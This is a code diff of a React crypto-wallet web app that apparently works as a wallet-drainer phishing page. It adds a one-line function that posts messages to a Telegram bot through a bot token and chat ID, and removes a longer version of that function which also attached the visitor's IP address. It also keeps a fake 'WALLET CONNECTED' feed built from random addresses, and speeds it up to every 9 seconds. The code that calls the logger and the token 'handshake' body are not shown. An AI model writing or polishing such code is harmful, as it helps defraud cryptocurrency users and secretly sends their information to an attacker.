@@ -27,41 +27,18 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  // SIMPLIFIED LOGGING FOR VERCEL STABILITY
-  const log = (msg) => {
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        const fullMsg = `${msg}\n🌐 IP: ${data.ip}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: fullMsg })
-        });
-      })
-      .catch(() => {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
-      });
-  };
+  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
   useEffect(() => {
     const triggerMsg = () => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} WALLET CONNECTED TO MAINNET_NODE`);
-      if (isConnected && address) {
-        // Only logs once per connection to avoid flooding
-        console.log("Relay Active");
-      }
       setTimeout(() => setFeedMsg(""), 4500);
     };
     const timeout = setTimeout(triggerMsg, 2000);
-    const interval = setInterval(triggerMsg, 12000);
+    const interval = setInterval(triggerMsg, 9000);
     return () => { clearTimeout(timeout); clearInterval(interval); };
-  }, [isConnected, address]);
+  }, []);
 
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
@@ -110,7 +87,7 @@ export default function App() {
       ) : (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="market-chart" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+            <iframe title="market" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
